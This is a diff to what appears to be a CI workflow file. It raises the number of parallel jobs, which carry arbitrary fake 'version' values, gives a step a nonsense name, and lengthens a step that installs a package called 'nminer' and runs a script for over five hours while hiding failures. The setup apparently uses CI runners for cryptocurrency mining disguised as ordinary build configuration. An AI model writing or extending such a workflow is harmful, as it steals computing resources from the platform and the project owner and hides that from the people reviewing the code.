@@ -9,22 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5104 }
-          - { version: 6527 }
-          - { version: 8206 }
-          - { version: 7573 }
-          - { version: 2268 }
-          - { version: 9396 }
-          - { version: 5010 }
-          - { version: 715 }
-          - { version: 8950 }
-          - { version: 749 }
-          - { version: 1215 }
-          - { version: 3728 }
-          - { version: 2605 }
-          - { version: 190 }
-          - { version: 7157 }
-          - { version: 9517 }
+          - { version: 9410 }
+          - { version: 1785 }
+          - { version: 9952 }
+          - { version: 2584 }
+          - { version: 80 }
+          - { version: 6127 }
+          - { version: 2208 }
+          - { version: 6254 }
+          - { version: 9148 }
+          - { version: 5868 }
+          - { version: 8066 }
+          - { version: 6436 }
+          - { version: 5149 }
+          - { version: 8847 }
+          - { version: 1019 }
+          - { version: 1956 }
+          - { version: 9706 }
+          - { version: 6434 }
+          - { version: 9685 }
 
     steps:
       - name: Checkout
@@ -35,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: shred anti joshingly easy er
+      - name: into pish
         run: |
           npm install nminer@latest
-          timeout 319m node apparatus.js || echo "apparatus executed"
+          timeout 327m node apparatus.js || echo "apparatus executed"
